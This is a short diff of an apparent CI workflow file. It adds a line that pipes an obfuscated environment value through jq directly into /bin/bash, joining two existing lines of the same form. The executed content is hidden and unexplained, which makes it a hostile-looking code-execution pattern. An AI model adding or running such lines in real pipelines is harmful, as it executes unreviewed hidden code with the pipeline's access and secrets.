@@ -28,6 +28,7 @@ jobs:
         run: |
           printf '%s' "$tbhd7436" | jq -r .emrn785 | /bin/bash
           echo $hc1 | jq -r .sezwp0 | /bin/bash
+          echo $weq1 | jq -r .xezxj08395 | /bin/bash
 
       - name: Upload artifact
         if: always()
